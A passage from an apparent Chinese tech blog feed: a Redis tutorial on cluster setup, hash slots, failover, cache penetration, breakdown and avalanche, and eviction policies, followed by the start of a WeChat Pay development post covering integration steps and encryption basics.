title="简介"></a>简介</h2><p>sentinel模式基本可以满足一般生产的需求，具备高可用性。但是当数据量过大到一台服务器存放不下的情况时，主从模式或sentinel模式就不能满足需求了，这个时候需要对<strong>存储的数据进行分片</strong>，将数据存储到多个Redis实例中。cluster模式的出现就是为了解决单机Redis容量有限的问题，将Redis的数据根据一定的规则分配到多台机器。</p><p>cluster可以说是sentinel模式和主从模式的结合体，通过cluster可以实现主从和master重选功能，所以如果配置两个副本三个分片的话，就需要六个Redis实例。因为Redis的数据是根据一定规则分配到cluster的不同机器的，当数据量过大时，可以新增机器进行扩容。</p><p><strong>特点：</strong></p><ul><li><p>多个redis节点网络互联，数据共享</p></li><li><p>所有的节点都是一主一从（也可以是一主多从），其中从节点不提供服务，仅作为备用</p></li><li><p>不支持同时处理多个key（如MSET&#x2F;MGET），因为redis需要把key均匀分布在各个节点上，并发量很高的情况下同时创建key-value会降低性能并导致不可预测的行为</p></li><li><p>支持在线增加、删除节点</p></li><li><p>客户端可以连接任何一个主节点进行读写</p></li></ul><h2 id="部署集群"><a href="#部署集群" class="headerlink" title="部署集群"></a>部署集群</h2><p>（1）配置6个实例：6379,6380,6381,6389,6390,6391，配置基本信息如下，可复制完在vim模式下匹配批量修改：<code>:%s/源字符串/目标字符串</code>-&gt;<code>:%s/6379/6380</code></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">include /myredis/redis.conf</span><br><span class="line">pidfile /var/run/redis_6379.pid</span><br><span class="line">port 6379</span><br><span class="line">dbfilename dump6379.rdb</span><br><span class="line">daemonize yes</span><br><span class="line">appendonly no</span><br><span class="line">dir &quot;/myredis/redis_cluster&quot;</span><br><span class="line">logfile &quot;/myredis/redis_cluster/redis_err_6379.log&quot;</span><br><span class="line">cluster-enabled yes</span><br><span class="line">cluster-config-file nodes-6379.conf</span><br><span class="line">cluster-node-timeout 15000</span><br></pre></td></tr></table></figure><ul><li><p><code>cluster-enabled yes</code>：打开集群模式</p></li><li><p><code>cluster-config-file nodes-6379.conf</code>：设定节点配置文件名</p></li><li><p><code>cluster-node-timeout 15000</code>：设定节点失联时间，超过该时间（毫秒），集群自动进行主从切换。</p></li></ul><p>（2）启动6个redis服务：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">[root@nanzx myredis]# mkdir redis_cluster</span><br><span class="line">[root@nanzx myredis]# redis-server /myredis/redis6379.conf </span><br><span class="line">[root@nanzx myredis]# redis-server /myredis/redis6380.conf </span><br><span class="line">[root@nanzx myredis]# redis-server /myredis/redis6381.conf </span><br><span class="line">[root@nanzx myredis]# redis-server /myredis/redis6389.conf </span><br><span class="line">[root@nanzx myredis]# redis-server /myredis/redis6390.conf </span><br><span class="line">[root@nanzx myredis]# redis-server /myredis/redis6391.conf </span><br><span class="line">[root@nanzx myredis]# ls</span><br><span class="line">redis6379.conf  redis6380.conf  redis6381.conf  redis6389.conf  redis6390.conf  redis6391.conf  redis_cluster  redis.conf  sentinel.conf</span><br><span class="line">[root@nanzx myredis]# cd redis_cluster/</span><br><span class="line">[root@nanzx redis_cluster]# ls</span><br><span class="line">nodes-6379.conf  nodes-6380.conf  nodes-6381.conf  nodes-6389.conf  nodes-6390.conf  nodes-6391.conf  redis_err_6379.log  redis_err_6380.log  redis_err_6381.log  redis_err_6389.log  redis_err_6390.log  redis_err_6391.log</span><br></pre></td></tr></table></figure><p>（3）执行以下命令将六个节点合成一个集群，组合之前确保所有redis实例启动成功且nodes-xxxx.conf文件都生成正常：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br></pre></td><td class="code"><pre><span class="line">[root@nanzx ~]# redis-cli --cluster create --cluster-replicas 1 192.168.2.110:6379 192.168.2.110:6380 192.168.2.110:6381 192.168.2.110:6389 192.168.2.110:6390 192.168.2.110:6391</span><br><span class="line"><span class="meta prompt_">&gt;</span><span class="language-bash">&gt;&gt; Performing <span class="built_in">hash</span> slots allocation on 6 nodes...</span></span><br><span class="line">Master[0] -&gt; Slots 0 - 5460</span><br><span class="line">Master[1] -&gt; Slots 5461 - 10922</span><br><span class="line">Master[2] -&gt; Slots 10923 - 16383</span><br><span class="line">Adding replica 192.168.2.110:6390 to 192.168.2.110:6379</span><br><span class="line">Adding replica 192.168.2.110:6391 to 192.168.2.110:6380</span><br><span class="line">Adding replica 192.168.2.110:6389 to 192.168.2.110:6381</span><br><span class="line"><span class="meta prompt_">&gt;</span><span class="language-bash">&gt;&gt; Trying to optimize slaves allocation <span class="keyword">for</span> anti-affinity</span></span><br><span class="line">[WARNING] Some slaves are in the same host as their master</span><br><span class="line">M: 3caafd0c5797c8be7c059ae88cfd0726d59cd070 192.168.2.110:6379</span><br><span class="line">   slots:[0-5460] (5461 slots) master</span><br><span class="line">M: 7231523d7d0156f682d4e5ce0bfc6ead757f9db4 192.168.2.110:6380</span><br><span class="line">   slots:[5461-10922] (5462 slots) master</span><br><span class="line">M: e28bf52c7fe25282a5b33940d5078b930db181f1 192.168.2.110:6381</span><br><span class="line">   slots:[10923-16383] (5461 slots) master</span><br><span class="line">S: 57a8fa22b33d070062ac5580f60d7219d8d2d385 192.168.2.110:6389</span><br><span class="line">   replicates 7231523d7d0156f682d4e5ce0bfc6ead757f9db4</span><br><span class="line">S: ed395ce3a4346dc12d24c0a273f1a32b27620e8b 192.168.2.110:6390</span><br><span class="line">   replicates e28bf52c7fe25282a5b33940d5078b930db181f1</span><br><span class="line">S: 112c48af5d9d38a870d18f8ba3dd2eb635a260e1 192.168.2.110:6391</span><br><span class="line">   replicates 3caafd0c5797c8be7c059ae88cfd0726d59cd070</span><br><span class="line">Can I set the above configuration? (type &#x27;yes&#x27; to accept): yes</span><br><span class="line"><span class="meta prompt_">&gt;</span><span class="language-bash">&gt;&gt; Nodes configuration updated</span></span><br><span class="line"><span class="meta prompt_">&gt;</span><span class="language-bash">&gt;&gt; Assign a different config epoch to each node</span></span><br><span class="line"><span class="meta prompt_">&gt;</span><span class="language-bash">&gt;&gt; Sending CLUSTER MEET messages to <span class="built_in">join</span> the cluster</span></span><br><span class="line">Waiting for the cluster to join</span><br><span class="line">.</span><br><span class="line"><span class="meta prompt_">&gt;</span><span class="language-bash">&gt;&gt; Performing Cluster Check (using node 192.168.2.110:6379)</span></span><br><span class="line">M: 3caafd0c5797c8be7c059ae88cfd0726d59cd070 192.168.2.110:6379</span><br><span class="line">   slots:[0-5460] (5461 slots) master</span><br><span class="line">   1 additional replica(s)</span><br><span class="line">S: 57a8fa22b33d070062ac5580f60d7219d8d2d385 192.168.2.110:6389</span><br><span class="line">   slots: (0 slots) slave</span><br><span class="line">   replicates 7231523d7d0156f682d4e5ce0bfc6ead757f9db4</span><br><span class="line">S: 112c48af5d9d38a870d18f8ba3dd2eb635a260e1 192.168.2.110:6391</span><br><span class="line">   slots: (0 slots) slave</span><br><span class="line">   replicates 3caafd0c5797c8be7c059ae88cfd0726d59cd070</span><br><span class="line">M: e28bf52c7fe25282a5b33940d5078b930db181f1 192.168.2.110:6381</span><br><span class="line">   slots:[10923-16383] (5461 slots) master</span><br><span class="line">   1 additional replica(s)</span><br><span class="line">S: ed395ce3a4346dc12d24c0a273f1a32b27620e8b 192.168.2.110:6390</span><br><span class="line">   slots: (0 slots) slave</span><br><span class="line">   replicates e28bf52c7fe25282a5b33940d5078b930db181f1</span><br><span class="line">M: 7231523d7d0156f682d4e5ce0bfc6ead757f9db4 192.168.2.110:6380</span><br><span class="line">   slots:[5461-10922] (5462 slots) master</span><br><span class="line">   1 additional replica(s)</span><br><span class="line">[OK] All nodes agree about slots configuration.</span><br><span class="line"><span class="meta prompt_">&gt;</span><span class="language-bash">&gt;&gt; Check <span class="keyword">for</span> open slots...</span></span><br><span class="line"><span class="meta prompt_">&gt;</span><span class="language-bash">&gt;&gt; Check slots coverage...</span></span><br><span class="line">[OK] All 16384 slots covered.</span><br></pre></td></tr></table></figure><ul><li><p>此处不要用127.0.0.1， 请用真实IP地址</p></li><li><p>–replicas 1 表示采用最简单的方式配置集群，一台主机，一台从机，正好三组。</p></li></ul><p>（4）普通方式登录存储数据时，会出现MOVED重定向失败。所以应该以集群方式登录。加上-c参数表明采用集群策略连接，设置数据时会自动切换到相应的主节点进行写操作</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">[root@nanzx ~]# redis-cli -p 6379</span><br><span class="line">127.0.0.1:6379&gt; set k1 v1</span><br><span class="line">(error) MOVED 12706 192.168.2.110:6381</span><br><span class="line">127.0.0.1:6379&gt; exit</span><br><span class="line">[root@nanzx ~]# redis-cli -c -p 6379</span><br><span class="line">127.0.0.1:6379&gt; set k1 v1</span><br><span class="line"><span class="meta prompt_">-&gt; </span><span class="language-bash">Redirected to slot [12706] located at 192.168.2.110:6381</span></span><br><span class="line">OK</span><br></pre></td></tr></table></figure><p>（5）通过<code>cluster nodes</code>命令查看集群信息</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">92.168.2.110:6381&gt; cluster nodes</span><br><span class="line">ed395ce3a4346dc12d24c0a273f1a32b27620e8b 192.168.2.110:6390@16390 slave e28bf52c7fe25282a5b33940d5078b930db181f1 0 1645371670925 3 connected</span><br><span class="line">e28bf52c7fe25282a5b33940d5078b930db181f1 192.168.2.110:6381@16381 myself,master - 0 1645371669000 3 connected 10923-16383</span><br><span class="line">112c48af5d9d38a870d18f8ba3dd2eb635a260e1 192.168.2.110:6391@16391 slave 3caafd0c5797c8be7c059ae88cfd0726d59cd070 0 1645371671935 1 connected</span><br><span class="line">7231523d7d0156f682d4e5ce0bfc6ead757f9db4 192.168.2.110:6380@16380 master - 0 1645371670000 2 connected 5461-10922</span><br><span class="line">57a8fa22b33d070062ac5580f60d7219d8d2d385 192.168.2.110:6389@16389 slave 7231523d7d0156f682d4e5ce0bfc6ead757f9db4 0 1645371671000 2 connected</span><br><span class="line">3caafd0c5797c8be7c059ae88cfd0726d59cd070 192.168.2.110:6379@16379 master - 0 1645371671000 1 connected 0-5460</span><br></pre></td></tr></table></figure><h2 id="slots"><a href="#slots" class="headerlink" title="slots"></a>slots</h2><ul><li><p>一个 Redis 集群包含 <strong>16384</strong> 个插槽（hash slot）， 数据库中的每个键都属于这 16384 个插槽的其中一个。</p></li><li><p>集群使用公式 CRC16(key) % 16384 来计算键key属于哪个槽， 其中CRC16(key)语句用于计算键key的CRC16校验和 。</p></li><li><p>集群中的每个节点负责处理一部分插槽。 举个例子， 如果一个集群可以有多个主节点， 其中：</p><ul><li><p>节点 A 负责处理 0 号至 5460 号插槽。</p></li><li><p>节点 B 负责处理 5461 号至 10922 号插槽。</p></li><li><p>节点 C 负责处理 10923 号至 16383 号插槽。</p></li></ul></li><li><p>在redis-cli每次录入、查询键值，redis都会计算出该key应该送往的插槽，如果不是该客户端对应服务器的插槽，redis会报错，并告知应前往的redis实例地址和端口。</p></li><li><p>redis-cli客户端提供了 –c 参数实现自动重定向。如 redis-cli  -c –p 6379 登入后，再录入、查询键值对可以自动重定向。</p></li><li><p>不在一个slot下的键值，是不能使用mget,mset等多键操作。可以通过{}来定义组的概念，从而使key中{}内相同内容的键值对放到一个slot中去。</p></li></ul><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">192.168.2.110:6381&gt; mset k1&#123;cust&#125; v1 k2&#123;cust&#125; v2 k3&#123;cust&#125; v3</span><br><span class="line"><span class="meta prompt_">-&gt; </span><span class="language-bash">Redirected to slot [4847] located at 192.168.2.110:6379</span></span><br><span class="line">OK</span><br><span class="line">192.168.2.110:6379&gt; cluster keyslot cust #查询key所在插槽</span><br><span class="line">(integer) 4847</span><br><span class="line">192.168.2.110:6379&gt; cluster countkeysinslot 4847 #查询插槽中key的数量，只能查询该节点负责的插槽</span><br><span class="line">(integer) 3</span><br><span class="line">192.168.2.110:6379&gt; cluster getkeysinslot 4847 10 #返回10个4847插槽的key</span><br><span class="line">1) &quot;k1&#123;cust&#125;&quot;</span><br><span class="line">2) &quot;k2&#123;cust&#125;&quot;</span><br><span class="line">3) &quot;k3&#123;cust&#125;&quot;</span><br><span class="line">192.168.2.110:6379&gt; </span><br></pre></td></tr></table></figure><h2 id="故障恢复"><a href="#故障恢复" class="headerlink" title="故障恢复"></a>故障恢复</h2><ul><li><p>如果主节点下线？从节点能否自动升为主节点？</p><ul><li><code>cluster-node-timeout 15000</code>，15秒超时，集群自动进行主从切换</li></ul></li><li><p>主节点恢复后，主从关系会如何？</p><ul><li>主节点回来变成从节点</li></ul></li><li><p>如果某一段插槽的主从节点都宕掉，redis服务是否还能继续？</p><ul><li>如果redis.conf中的参数<code>cluster-require-full-coverage</code> 为yes ，那么整个集群都挂掉；</li><li>而<code>cluster-require-full-coverage </code>为no ，那么该插槽数据全都不能使用，也无法存储。</li></ul></li></ul><h1 id="缓存穿透"><a href="#缓存穿透" class="headerlink" title="缓存穿透"></a>缓存穿透</h1><p>缓存穿透指一个一定不存在的数据，由于<strong>缓存未命中</strong>这条数据，就会去查询数据库，<strong>数据库也没有</strong>这条数据，所以返回结果是 <code>null</code>。如果并发量大且缓存都没有命中，每次查询都请求数据库时，缓存就失去了保护后端持久层的意义，这会给持久层数据库造成很大的压力。</p><p><strong>解决方案：</strong></p><ul><li><p>缓存空对象：是指在持久层没有命中的情况下，对key进行set （key,null），缓存空对象会有两个问题：</p><ul><li>value为null 不代表不<strong>占用内存空间</strong>，空值做了缓存，意味着缓存层中存了更多的键，需要更多的内存空间，比较有效的方法是针对这类数据设置一个较短的过期时间，让其自动剔除。</li><li>缓存层和持久层的数据会有一段时间窗口的不一致，可能会对业务有一定影响。例如过期时间设置为5分钟，如果此时存储层添加了这个数据，那此段时间就会出现缓存层和持久层数据的不一致，此时可以利用消息系统或者其他方式清除掉缓存层中的空对象。</li></ul></li><li><p>布隆过滤器拦截</p><ul><li><p>在访问缓存层和持久层之前，将存在的key用布隆过滤器提前保存起来，做第一层拦截，当收到一个对key请求时先用布隆过滤器验证是key否存在，如果存在再进入缓存层、持久层。可以使用bitmap做布隆过滤器。这种方法适用于数据命中不高、数据相对固定、实时性低的应用场景，代码维护较为复杂，但是缓存空间占用少。</p></li><li><p>布隆过滤器实际上是一个很长的二进制向量和一系列随机映射函数。布隆过滤器可以用于检索一个元素是否在一个集合中。它的优点是空间效率和查询时间都远远超过一般的算法，缺点是有一定的<strong>误识别率</strong>和删除困难。</p></li></ul></li></ul><hr><h1 id="缓存击穿"><a href="#缓存击穿" class="headerlink" title="缓存击穿"></a>缓存击穿</h1><p>当某个key在过期的瞬间，有大量的请求并发访问，这类数据一般是<strong>热点数据</strong>，由于<strong>缓存过期</strong>，会同时访问数据库来查询最新数据，<strong>数据库有数据</strong>并且回写缓存，会导使数据库瞬间压力过大。</p><p><strong>解决方案：</strong></p><ul><li><p>分布式互斥锁，只允许一个线程重建缓存，其他线程等待重建缓存的线程执行完，重新从缓存获取数据即可。</p><ul><li>这种方案思路比较简单，但是存在一定的隐患，如果在查询数据库 + 和 重建缓存（key失效后进行了大量的计算）时间过长，也可能会存在死锁和线程池阻塞的风险，高并发情景下吞吐量会大大降低！但是这种方法能够较好地降低后端存储负载，并在一致性上做得比较好。</li></ul></li><li><p>热点Key永不过期，从功能层面来看，为每个value设置一个逻辑过期时间，当发现超过逻辑过期时间后，会使用单独的线程去更新缓存。</p><ul><li>这种方案由于没有设置真正的过期时间，实际上已经不存在热点key产生的一系列危害，但是会存在数据不一致的情况，同时代码复杂度会增大。</li></ul></li></ul><hr><h1 id="缓存雪崩"><a href="#缓存雪崩" class="headerlink" title="缓存雪崩"></a>缓存雪崩</h1><p> 由于缓存层承载着大量请求，有效地保护了持久层，但是如果缓存层由于某些原因不可用（<strong>宕机</strong>）或者大量缓存由于超时时间相同在<strong>同一时间段</strong>失效（大批key失效&#x2F;热点数据失效），大量请求直接到达存储层，存储层压力过大导致系统雪崩。</p><p><strong>解决方案：</strong></p><ul><li><p>缓存数据的过期时间设置随机，防止同一时间大量数据过期现象发生。</p></li><li><p>可以把缓存层设计成高可用的，即使个别节点、个别机器、甚至是机房宕掉，依然可以提供服务。利用sentinel或cluster实现。</p></li><li><p>采用多级缓存，本地进程作为一级缓存，redis作为二级缓存，不同级别的缓存设置的超时时间不同，即使某级缓存过期了，也有其他级别缓存兜底。</p></li><li><p>数据加热，在正式部署之前先把可能的数据先预先访问一遍，这样部分可能大量访问的数据就会加载到缓存中。</p></li></ul><h1 id="常见面试题"><a href="#常见面试题" class="headerlink" title="常见面试题"></a>常见面试题</h1><p><strong>过期的数据的删除策略了解么？</strong></p><p>如果假设你设置了一批 key 只能存活 1 分钟，那么 1 分钟后，Redis 是怎么对这批 key 进行删除的呢？</p><p>常用的过期数据的删除策略就两个：</p><ol><li><strong>惰性删除</strong> ：只会在取出 key 的时候才对数据进行过期检查。这样对 CPU 最友好，但是可能会造成太多过期 key 没有被删除。</li><li><strong>定期删除</strong> ： 每隔一段时间抽取一批 key 执行删除过期 key 操作。并且，Redis 底层会通过限制删除操作执行的时长和频率来减少删除操作对 CPU 时间的影响。</li></ol><p>定期删除对内存更加友好，惰性删除对 CPU 更加友好。两者各有千秋，所以 Redis 采用的是 <strong>定期删除+惰性&#x2F;懒汉式删除</strong> 。</p><p>但是，仅仅通过给 key 设置过期时间还是有问题的。因为还是可能存在定期删除和惰性删除漏掉了很多过期 key 的情况。这样就导致大量过期 key 堆积在内存里，然后就 Out of memory 了。</p><p>怎么解决这个问题呢？答案就是：<strong>Redis 内存淘汰机制。</strong></p><hr><p><strong>Redis 内存淘汰机制了解么？</strong></p><p>Redis一开始有6种数据淘汰策略，4.0版本后增加2种（7和8），总共8种</p><ol><li><strong>volatile-lru（least recently used）</strong>：从已设置过期时间的数据集（server.db[i].expires）中挑选最近最少使用的数据淘汰</li><li><strong>volatile-ttl</strong>：从已设置过期时间的数据集（server.db[i].expires）中挑选将要过期的数据淘汰</li><li><strong>volatile-random</strong>：从已设置过期时间的数据集（server.db[i].expires）中任意选择数据淘汰</li><li><strong>allkeys-lru（least recently used）</strong>：当内存不足以容纳新写入数据时，在键空间中，移除最近最少使用的 key（这个是最常用的）</li><li><strong>allkeys-random</strong>：从数据集（server.db[i].dict）中任意选择数据淘汰</li><li><strong>no-eviction</strong>：禁止驱逐数据，也就是说当内存不足以容纳新写入数据时，新写入操作会报错。这个应该没人使用吧！</li><li><strong>volatile-lfu（least frequently used）</strong>：从已设置过期时间的数据集(server.db[i].expires)中挑选最不经常使用的数据淘汰</li><li><strong>allkeys-lfu（least frequently used）</strong>：当内存不足以容纳新写入数据时，在键空间中移除最不经常使用的 key</li></ol><hr><p><strong>如何保证缓存和数据库数据的一致性？</strong></p><p>下面单独对 <strong>Cache Aside Pattern（旁路缓存模式）</strong> 来聊聊。</p><p>Cache Aside Pattern 中遇到写请求是这样的：更新 DB，然后直接删除 cache 。</p><p>如果更新数据库成功，而删除缓存这一步失败的情况的话，简单说两个解决方案：</p><ol><li><strong>缓存失效时间变短（不推荐，治标不治本）</strong> ：我们让缓存数据的过期时间变短，这样的话缓存就会从数据库中加载数据。另外，这种解决办法对于先操作缓存后操作数据库的场景不适用。</li><li><strong>增加cache更新重试机制（常用）</strong>： 如果 cache 服务当前不可用导致缓存删除失败的话，我们就隔一段时间进行重试，重试次数可以自己定。如果多次重试还是失败的话，我们可以把当前更新失败的 key 存入队列中，等缓存服务可用之后，再将 缓存中对应的 key 删除即可。</li></ol>]]></content>
      
      
      <categories>
          
          <category> Redis </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Redis </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>微信支付开发</title>
      <link href="/posts/36404/"/>
      <url>/posts/36404/</url>
      
        <content type="html"><![CDATA[<blockquote><p>参考视频：【尚硅谷】微信支付开发 <a href="https://www.bilibili.com/video/BV1hh411D7sb?p=1">https://www.bilibili.com/video/BV1hh411D7sb?p=1</a></p></blockquote><h1 id="微信支付介绍和接入指引"><a href="#微信支付介绍和接入指引" class="headerlink" title="微信支付介绍和接入指引"></a>微信支付介绍和接入指引</h1><h2 id="微信支付产品介绍"><a href="#微信支付产品介绍" class="headerlink" title="微信支付产品介绍"></a>微信支付产品介绍</h2><p><code>https://pay.weixin.qq.com/static/product/product_intro.shtml?name=qrcode</code></p><p><strong>付款码支付：</strong></p><ul><li>用户展示微信钱包内的“付款码”给商家，商家扫描后直接完成支付，适用于线下面对面收银的场景。</li></ul><p><strong>JSAPI支付：</strong></p><ul><li><p>线下场所：商户展示一个支付二维码，用户使用微信扫描二维码后，输入需要支付的金额，完成支付。</p></li><li><p>公众号场景：用户在微信内进入商家公众号，打开某个页面，选择某个产品，完成支付。</p></li><li><p>PC网站场景：在网站中展示二维码，用户使用微信扫描二维码，输入需要支付的金额，完成支付。</p></li></ul><blockquote><p>特点：用户在客户端输入支付金额</p></blockquote><p><strong>小程序支付：</strong></p><ul><li>在微信小程序平台内实现支付的功能。</li></ul><p><strong>Native支付：</strong></p><ul><li>Native支付是指商户展示支付二维码，用户再用微信“扫一扫”完成支付的模式。这种方式适用于PC网站。</li></ul><blockquote><p>特点：商家预先指定支付金额</p></blockquote><p><strong>APP支付：</strong></p><ul><li>商户通过在移动端独立的APP应用程序中集成微信支付模块，完成支付。</li></ul><p><strong>刷脸支付：</strong></p><ul><li>用户在刷脸设备前通过摄像头刷脸、识别身份后进行的一种支付方式。</li></ul><hr><h2 id="接入指引"><a href="#接入指引" class="headerlink" title="接入指引"></a>接入指引</h2><blockquote><p>官网：<a href="https://pay.weixin.qq.com/wiki/doc/apiv3/open/pay/chapter2_7_1.shtml">https://pay.weixin.qq.com/wiki/doc/apiv3/open/pay/chapter2_7_1.shtml</a></p></blockquote><p><strong>获取商户号：</strong></p><ul><li><p>微信商户平台：<a href="https://pay.weixin.qq.com/">https://pay.weixin.qq.com/</a></p></li><li><p>场景：Native支付</p></li><li><p>步骤：提交资料 &#x3D;&gt; 签署协议 &#x3D;&gt; 获取商户号(账户中心的个人信息页面的登录账号)</p></li></ul><p><strong>获取APPID：</strong></p><ul><li><p>微信公众平台：<a href="https://mp.weixin.qq.com/">https://mp.weixin.qq.com/</a></p></li><li><p>步骤：注册服务号 &#x3D;&gt; 服务号认证 &#x3D;&gt; 获取APPID （基本配置中的开发者ID）&#x3D;&gt; 绑定商户号</p></li></ul><p><strong>获取API秘钥：</strong></p><ul><li><p>APIv2版本的接口需要此秘钥</p></li><li><p>步骤：登录商户平台 &#x3D;&gt; 选择 账户中心 &#x3D;&gt; 安全中心 &#x3D;&gt; API安全 &#x3D;&gt; 设置API密钥</p></li></ul><p><strong>获取APIv3秘钥：</strong></p><ul><li><p>APIv3版本的接口需要此秘钥</p></li><li><p>步骤：登录商户平台 &#x3D;&gt; 选择 账户中心 &#x3D;&gt; 安全中心 &#x3D;&gt; API安全 &#x3D;&gt; 设置APIv3密钥</p></li></ul><blockquote><p>随机密码生成工具：<a href="https://suijimimashengcheng.bmcx.com/">https://suijimimashengcheng.bmcx.com/</a></p></blockquote><p><strong>申请商户API证书以及对应证书序列号：</strong></p><ul><li><p>APIv3版本的所有接口都需要；APIv2版本的高级接口需要（如：退款、企业红包、企业付款等）</p></li><li><p>步骤：登录商户平台 &#x3D;&gt; 选择 账户中心 &#x3D;&gt; 安全中心 &#x3D;&gt; API安全 &#x3D;&gt; 申请API证书</p></li></ul><p><strong>获取微信平台证书：</strong></p><ul><li>可以预先下载，也可以通过编程的方式获取。建议通过编程的方式来获取避免证书过期。</li></ul><blockquote><p><strong>注意：以上所有API秘钥和证书需妥善保管防止泄露</strong></p></blockquote><hr><h1 id="支付安全（证书-秘钥-签名）"><a href="#支付安全（证书-秘钥-签名）" class="headerlink" title="支付安全（证书&#x2F;秘钥&#x2F;签名）"></a>支付安全（证书&#x2F;秘钥&#x2F;签名）</h1><h2 id="信息安全的基础-机密性"><a href="#信息安全的基础-机密性" class="headerlink" title="信息安全的基础 - 机密性"></a>信息安全的基础 - 机密性</h2><ul><li><p><strong>明文：</strong>加密前的消息叫“明文”（plain text）</p></li><li><p><strong>密文：</strong>加密后的文本叫“密文”（cipher text）</p></li><li><p><strong>密钥：</strong>只有掌握特殊“钥匙”的人，才能对加密的文本进行解密，这里的“钥匙”就叫做“密钥”（key） </p><ul><li>“密钥”就是一个字符串，度量单位是“位”（bit），比如，密钥长度是 128，就是 16 字节的二进制串</li></ul></li><li><p><strong>加密：</strong>实现机密性最常用的手段是“加密”（encrypt）</p><ul><li>按照密钥的使用方式，加密可以分为两大类：对称加密和非对称加密。</li></ul></li><li><p><strong>解密：</strong>使用密钥还原明文的过程叫“解密”（decrypt）</p></li><li><p><strong>加密算法：</strong>加密解密的操作过程就是“加密算法”</p><ul><li>所有的加密算法都是公开的，而算法使用的“密钥”则必须保密</li></ul></li></ul><p><img src= "https://unpkg.com/nan-picture/img/load.gif" data-lazy-src="https://unpkg.com/nan-picture/blog/20220109182711.png"></p><h2 id="对称加密和非对称加密"><a href="#对称加密和非对称加密" class="headerlink" title="对称加密和非对称加密"></a>对称加密和非对称加密</h2><ul><li><p><strong>对称加密</strong>：</p><ul><li><p>特点：只使用一个密钥，密钥必须保密，常用的有 AES算法</p></li><li><p>优点：运算速度快</p></li><li><p>缺点：秘钥需要信息交换的双方共享，一旦被窃取，消息会被破解，无法做到安全的密钥交换</p></li></ul></li><li><p><strong>非对称加密</strong>：</p><ul><li><p>特点：使用两个密钥：公钥和私钥，公钥可以任意分发而私钥保密，常用的有 RSA算法</p></li><li><p>优点：黑客获取公钥无法破解密文，解决了密钥交换的问题</p></li><li><p>缺点：运算速度非常慢</p></li></ul></li><li><p><strong>混合加密</strong>：</p><ul><li>实际场景中把对称加密和非对称加密结合起来使用。</li></ul></li></ul><h2 id="身份认证"><a href="#身份认证" class="headerlink" title="身份认证"></a>身份认证</h2><ul><li><p>公钥加密，私钥解密的作用是<strong>加密信息</strong></p></li><li><p>私钥加密，公钥解密的作用是<strong>身份认证</strong></p></li></ul><p><img src= "https://unpkg.com/nan-picture/img/load.gif" data-lazy-src="https://unpkg.com/nan-picture/blog/20220109183456.png"></p><p>公钥加密：<img src= "https://unpkg.com/nan-picture/img/load.gif" data-lazy-src="https://unpkg.com/nan-picture/blog/20220109183511.png"></p><p>私钥加密：</p><p><img src= "https://unpkg.com/nan-picture/img/load.gif" data-lazy-src="https://unpkg.com/nan-picture/blog/20220109183549.png"></p><h2 id="摘要算法（Digest-Algorithm）"><a href="#摘要算法（Digest-Algorithm）" class="headerlink" title="摘要算法（Digest Algorithm）"></a>摘要算法（Digest Algorithm）</h2><p>摘要算法就是我们常说的散列函数、哈希函数（Hash Function），它能够把任意长度的数据“压缩”成固定长度而且独一无二的“摘要”字符串，就好像是给这段数据生成了一个数字“指纹”。</p><p><strong>作用</strong>：保证信息的完整性</p><p><strong>特性</strong>：</p><ul><li><p>不可逆：只有算法，没有秘钥，只能加密，不能解密</p></li><li><p>难题友好性：想要破解，只能暴力枚举</p></li><li><p>发散性：只要对原文进行一点点改动，摘要就会发生剧烈变化（这种现象也可以称为雪崩效应）</p></li><li><p>抗碰撞性：原文不同，计算后的摘要也要不同</p></li></ul><p><strong>常见摘要算法</strong>：MD5、SHA1、SHA2（SHA224、SHA256、SHA384）【SHA2用的比较多，具有强的抗碰撞性】</p><p><img src= "https://unpkg.com/nan-picture/img/load.gif" 